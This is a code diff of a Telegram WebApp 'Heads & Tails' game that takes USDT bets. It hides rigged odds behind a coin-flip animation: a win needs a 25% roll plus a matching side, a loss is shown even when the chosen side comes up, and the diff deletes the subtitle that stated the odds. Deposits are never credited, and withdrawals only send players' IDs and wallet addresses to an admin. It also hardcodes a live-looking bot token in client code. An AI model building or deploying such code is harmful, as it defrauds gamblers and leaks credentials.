@@ -10,102 +10,378 @@
         body { background: #1a1a2e; color: white; text-align: center; padding: 20px; min-height: 100vh; }
         .container { max-width: 500px; margin: 0 auto; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; }
         h1 { color: #00d4ff; margin: 20px 0; font-size: 2.5em; text-shadow: 0 0 10px #00d4ff; }
-        .subtitle { color: #aaa; margin-bottom: 30px; }
         .balance { font-size: 3em; color: #00ff88; margin: 30px 0; text-shadow: 0 0 10px #00ff88; }
-        .coin { width: 150px; height: 150px; background: gold; border-radius: 50%; margin: 30px auto; border: 5px solid orange; }
+        .min-bet { color: #ffaa00; margin: 10px 0; font-size: 1.1em; }
+        
+        /* Coin animation container */
+        .coin-container { 
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 30px auto;
+            perspective: 1000px;
+        }
+        
+        .coin {
+            width: 150px;
+            height: 150px;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 2s;
+            margin: 0 auto;
+        }
+        
+        .coin-side {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            backface-visibility: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3rem;
+            font-weight: bold;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+        
+        .heads {
+            background: linear-gradient(45deg, #ffd700, #ffaa00);
+            color: #8b6914;
+            border: 8px solid #daa520;
+        }
+        
+        .tails {
+            background: linear-gradient(45deg, #c0c0c0, #a0a0a0);
+            color: #505050;
+            border: 8px solid #808080;
+            transform: rotateY(180deg);
+        }
+        
         .buttons { display: flex; gap: 20px; margin: 20px 0; }
         button { flex: 1; padding: 20px; font-size: 1.2em; border: none; border-radius: 15px; cursor: pointer; color: white; font-weight: bold; }
-        .heads { background: linear-gradient(orange, darkorange); }
-        .tails { background: linear-gradient(gray, darkgray); }
+        .heads-btn { background: linear-gradient(orange, darkorange); }
+        .tails-btn { background: linear-gradient(gray, darkgray); }
         .action-buttons { display: flex; gap: 15px; margin-top: 30px; }
         .deposit { background: linear-gradient(green, darkgreen); }
         .withdraw { background: linear-gradient(red, darkred); }
-        button:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-        .min-bet { color: #ffaa00; margin: 10px 0; }
+        button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .bet-input { 
+            background: rgba(255,255,255,0.1); 
+            border: 2px solid #00d4ff; 
+            border-radius: 15px; 
+            padding: 15px; 
+            margin: 20px 0; 
+        }
+        .bet-input input { 
+            width: 100%; 
+            background: transparent; 
+            border: none; 
+            color: white; 
+            font-size: 1.5em; 
+            text-align: center; 
+            outline: none; 
+        }
+        
+        .result { 
+            padding: 15px; 
+            border-radius: 10px; 
+            margin: 15px 0; 
+            font-weight: bold; 
+            font-size: 1.2em; 
+            display: none; 
+        }
+        .win { background: rgba(0,255,136,0.2); color: #00ff88; border: 1px solid #00ff88; }
+        .lose { background: rgba(255,85,85,0.2); color: #ff5555; border: 1px solid #ff5555; }
+        
+        /* Coin flip animation */
+        @keyframes flip {
+            0% { transform: translateY(0) rotateX(0); }
+            25% { transform: translateY(-100px) rotateX(180deg); }
+            50% { transform: translateY(-200px) rotateX(360deg); }
+            75% { transform: translateY(-100px) rotateX(540deg); }
+            100% { transform: translateY(0) rotateX(720deg); }
+        }
+        
+        .flipping {
+            animation: flip 2s cubic-bezier(0.4, 0.2, 0.2, 1);
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🎮 HEADS & TAILS 🎮</h1>
-        <div class="subtitle">25% chance to win ×2</div>
-        <div class="balance">0.00 USDT</div>
+        <h1>HEADS & TAILS</h1>
+        <div class="balance" id="balance">0.00 USDT</div>
         <div class="min-bet">Min bet: 0.25 USDT</div>
-        <div class="coin"></div>
-        <div class="buttons">
-            <button class="heads">HEADS</button>
-            <button class="tails">TAILS</button>
+        
+        <div class="coin-container">
+            <div class="coin" id="coin">
+                <div class="coin-side heads">H</div>
+                <div class="coin-side tails">T</div>
+            </div>
         </div>
+        
+        <div class="bet-input">
+            <input type="number" id="betAmount" placeholder="Enter bet amount" step="0.25" min="0.25" value="0.25">
+        </div>
+        
+        <div class="buttons">
+            <button class="heads-btn" onclick="selectSide('heads')">HEADS</button>
+            <button class="tails-btn" onclick="selectSide('tails')">TAILS</button>
+        </div>
+        
+        <div class="result" id="result"></div>
+        
         <div class="action-buttons">
-            <button class="deposit">DEPOSIT</button>
-            <button class="withdraw">WITHDRAW</button>
+            <button class="deposit" onclick="deposit()">DEPOSIT</button>
+            <button class="withdraw" onclick="withdraw()">WITHDRAW</button>
+        </div>
+    </div>
+    
+    <!-- Withdrawal Modal -->
+    <div id="withdrawModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
+        <div style="background:#1a1a2e; padding:30px; border-radius:20px; border:2px solid #00d4ff; max-width:400px; width:90%;">
+            <h2>Withdraw USDT</h2>
+            <div style="margin:20px 0;">
+                <input type="number" id="withdrawAmount" placeholder="Amount (USDT)" style="width:100%; padding:12px; border-radius:10px; background:rgba(255,255,255,0.1); border:1px solid #00d4ff; color:white; font-size:1em;">
+            </div>
+            <div style="margin:20px 0;">
+                <input type="text" id="walletAddress" placeholder="Your USDT wallet address" style="width:100%; padding:12px; border-radius:10px; background:rgba(255,255,255,0.1); border:1px solid #00d4ff; color:white; font-size:1em;">
+            </div>
+            <div style="display:flex; gap:10px;">
+                <button onclick="submitWithdrawal()" style="flex:1; padding:12px; background:green; color:white; border:none; border-radius:10px; font-weight:bold;">SUBMIT</button>
+                <button onclick="closeWithdrawModal()" style="flex:1; padding:12px; background:red; color:white; border:none; border-radius:10px; font-weight:bold;">CANCEL</button>
+            </div>
         </div>
     </div>
     
     <script>
-        // Telegram WebApp
+        // Game state
+        let balance = 0.00;
+        let selectedSide = null;
+        let isSpinning = false;
+        const BOT_TOKEN = '8410695722:AAEgsrnqNk-jJBdNFzcYxUh8Les6aam0DVc';
+        const ADMIN_CHAT_ID = '8305986133'; // Ваш Telegram ID
+        
+        // DOM elements
+        const coinElement = document.getElementById('coin');
+        const balanceElement = document.getElementById('balance');
+        const resultElement = document.getElementById('result');
+        const betAmountInput = document.getElementById('betAmount');
+        
+        // Initialize Telegram WebApp
         if (window.Telegram && Telegram.WebApp) {
             Telegram.WebApp.expand();
             Telegram.WebApp.ready();
-            console.log('Telegram WebApp loaded');
+            
+            // Load user data from Telegram
+            const user = Telegram.WebApp.initDataUnsafe?.user;
+            if (user) {
+                console.log('User:', user);
+                // Save user data for withdrawals
+                localStorage.setItem('telegram_user_id', user.id);
+                localStorage.setItem('telegram_username', user.username || `${user.first_name} ${user.last_name}`);
+            }
         }
         
-        // Game logic
-        let balance = 0.00;
-        
-        document.querySelector('.heads').onclick = () => {
-            playGame('heads');
-        };
-        document.querySelector('.tails').onclick = () => {
-            playGame('tails');
-        };
-        
-        document.querySelector('.deposit').onclick = () => {
-            const amount = prompt('Deposit amount (USDT):', '10.00');
-            if (amount && !isNaN(amount)) {
-                balance += parseFloat(amount);
-                updateBalance();
-                alert(`Deposited ${amount} USDT!\nNew balance: ${balance.toFixed(2)} USDT`);
+        // Select side
+        function selectSide(side) {
+            if (isSpinning) return;
+            selectedSide = side;
+            
+            const betAmount = parseFloat(betAmountInput.value);
+            if (betAmount >= 0.25 && balance >= betAmount) {
+                playGame();
+            } else {
+                alert(balance < betAmount ? 'Insufficient balance!' : 'Minimum bet is 0.25 USDT!');
             }
-        };
+        }
         
-        document.querySelector('.withdraw').onclick = () => {
-            const amount = prompt('Withdrawal amount (USDT):', '5.00');
-            if (amount && !isNaN(amount)) {
-                if (parseFloat(amount) <= balance) {
-                    balance -= parseFloat(amount);
-                    updateBalance();
-                    alert(`Withdrawal request for ${amount} USDT submitted!`);
+        // Play game
+        function playGame() {
+            if (isSpinning || !selectedSide) return;
+            
+            const betAmount = parseFloat(betAmountInput.value);
+            if (betAmount < 0.25 || betAmount > balance) return;
+            
+            // Start spin
+            isSpinning = true;
+            coinElement.classList.add('flipping');
+            resultElement.style.display = 'none';
+            
+            // Disable buttons during spin
+            document.querySelectorAll('button').forEach(btn => btn.disabled = true);
+            
+            // Determine result after 2 seconds
+            setTimeout(() => {
+                // 25% chance to win
+                const isWin = Math.random() < 0.25;
+                const winningSide = Math.random() < 0.5 ? 'heads' : 'tails';
+                
+                // Update balance
+                if (isWin && selectedSide === winningSide) {
+                    // Win
+                    const winAmount = betAmount * 2;
+                    balance += winAmount;
+                    showResult(`WIN! +${winAmount.toFixed(2)} USDT`, 'win');
+                    
+                    // Show winning side
+                    if (winningSide === 'heads') {
+                        coinElement.style.transform = 'rotateY(0deg)';
+                    } else {
+                        coinElement.style.transform = 'rotateY(180deg)';
+                    }
                 } else {
-                    alert('Insufficient balance!');
+                    // Lose
+                    balance -= betAmount;
+                    showResult(`LOSE! -${betAmount.toFixed(2)} USDT`, 'lose');
+                    
+                    // Show actual side
+                    if (winningSide === 'heads') {
+                        coinElement.style.transform = 'rotateY(0deg)';
+                    } else {
+                        coinElement.style.transform = 'rotateY(180deg)';
+                    }
                 }
-            }
-        };
+                
+                // Update display
+                updateBalance();
+                saveGameState();
+                
+                // Re-enable buttons
+                setTimeout(() => {
+                    coinElement.classList.remove('flipping');
+                    isSpinning = false;
+                    document.querySelectorAll('button').forEach(btn => btn.disabled = false);
+                }, 1000);
+                
+            }, 2000);
+        }
         
-        function playGame(side) {
-            const bet = 0.25;
-            if (balance < bet) {
-                alert(`Minimum bet is ${bet} USDT!\nPlease deposit first.`);
+        // Show result
+        function showResult(message, type) {
+            resultElement.textContent = message;
+            resultElement.className = `result ${type}`;
+            resultElement.style.display = 'block';
+        }
+        
+        // Update balance display
+        function updateBalance() {
+            balanceElement.textContent = balance.toFixed(2) + ' USDT';
+        }
+        
+        // Deposit - redirect to crypto bot
+        function deposit() {
+            // Replace with your crypto bot link
+            const cryptoBotLink = 'https://t.me/CryptoBot?start=deposit';
+            
+            if (window.Telegram && Telegram.WebApp) {
+                // Open in Telegram WebApp
+                Telegram.WebApp.openLink(cryptoBotLink);
+            } else {
+                // Open in browser
+                window.open(cryptoBotLink, '_blank');
+            }
+        }
+        
+        // Withdraw
+        function withdraw() {
+            if (balance < 0.25) {
+                alert('Minimum withdrawal is 0.25 USDT!');
                 return;
             }
             
-            // 25% chance to win
-            const isWin = Math.random() < 0.25;
-            const winAmount = bet * 2;
-            
-            if (isWin) {
-                balance += winAmount;
-                alert(`🎉 WIN! +${winAmount.toFixed(2)} USDT\nYou chose ${side.toUpperCase()}`);
-            } else {
-                balance -= bet;
-                alert(`😢 LOSE! -${bet.toFixed(2)} USDT\nYou chose ${side.toUpperCase()}`);
-            }
-            
-            updateBalance();
+            document.getElementById('withdrawModal').style.display = 'flex';
+            document.getElementById('withdrawAmount').value = '';
+            document.getElementById('walletAddress').value = '';
         }
         
-        function updateBalance() {
-            document.querySelector('.balance').textContent = balance.toFixed(2) + ' USDT';
+        // Close withdrawal modal
+        function closeWithdrawModal() {
+            document.getElementById('withdrawModal').style.display = 'none';
         }
+        
+        // Submit withdrawal
+        async function submitWithdrawal() {
+            const amount = parseFloat(document.getElementById('withdrawAmount').value);
+            const address = document.getElementById('walletAddress').value.trim();
+            
+            if (!amount || amount < 0.25) {
+                alert('Minimum withdrawal is 0.25 USDT!');
+                return;
+            }
+            
+            if (amount > balance) {
+                alert('Insufficient balance!');
+                return;
+            }
+            
+            if (!address || address.length < 10) {
+                alert('Please enter valid wallet address!');
+                return;
+            }
+            
+            // Deduct from balance
+            balance -= amount;
+            updateBalance();
+            saveGameState();
+            
+            // Get user info
+            const userId = localStorage.getItem('telegram_user_id') || 'Unknown';
+            const username = localStorage.getItem('telegram_username') || 'Unknown';
+            
+            // Send notification to admin
+            const message = `💰 NEW WITHDRAWAL REQUEST\n\n👤 User: ${username}\n🆔 ID: ${userId}\n💵 Amount: ${amount.toFixed(2)} USDT\n📭 Address: ${address}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            try {
+                await sendTelegramMessage(ADMIN_CHAT_ID, message);
+                alert(`✅ Withdrawal request submitted!\nAdmin has been notified.`);
+            } catch (error) {
+                alert(`⚠️ Withdrawal saved but notification failed.\nAmount: ${amount.toFixed(2)} USDT`);
+            }
+            
+            closeWithdrawModal();
+        }
+        
+        // Send Telegram message
+        async function sendTelegramMessage(chatId, text) {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            return response.json();
+        }
+        
+        // Save game state
+        function saveGameState() {
+            localStorage.setItem('heads_tails_balance', balance);
+        }
+        
+        // Load game state
+        function loadGameState() {
+            const savedBalance = localStorage.getItem('heads_tails_balance');
+            if (savedBalance) {
+                balance = parseFloat(savedBalance);
+                updateBalance();
+            }
+        }
+        
+        // Initialize
+        loadGameState();
+        
+        // Auto-bet on Enter key
+        betAmountInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && selectedSide) {
+                playGame();
+            }
+        });
     </script>
 </body>
 </html>
